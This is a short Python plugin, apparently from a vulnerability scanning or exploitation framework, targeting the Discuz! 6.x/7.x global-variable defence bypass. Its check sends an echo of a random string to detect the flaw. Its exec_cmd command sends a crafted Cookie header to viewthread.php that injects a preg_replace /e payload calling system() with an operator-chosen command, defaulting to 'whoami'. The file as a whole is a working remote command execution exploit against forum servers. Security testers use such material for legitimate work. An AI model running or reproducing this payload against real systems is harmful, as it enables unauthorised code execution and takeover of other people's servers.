# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "Discuz! 6.x/7.x 全局变量防御绕过漏洞",
        "version": "Discuz! Discuz! 6.x or 7.x",
        "description": "Discuz!是一款国内流行的论坛程序。由于php5.3.x版本php.ini的设置中request_order默认值为GP，导致Discuz! 6.x/7.x中可以绕过全局变量防御。",
        "references": ["-"],
    }

    def url(self) -> dict:
        random_str = self.build_random_str(12)
        res = self.exec_cmd(self.target.value, f'echo {random_str}')
        if res and random_str in res:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        r = self.request(
            method='GET',
            url=urllib.parse.urljoin(url, './viewthread.php?tid=10&extra=page%3D1'),
            headers={
                'Cookie': f'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=system("{cmd}");'
            },
            timeout=15
        )
        if r.status_code == 200:
            return r.text
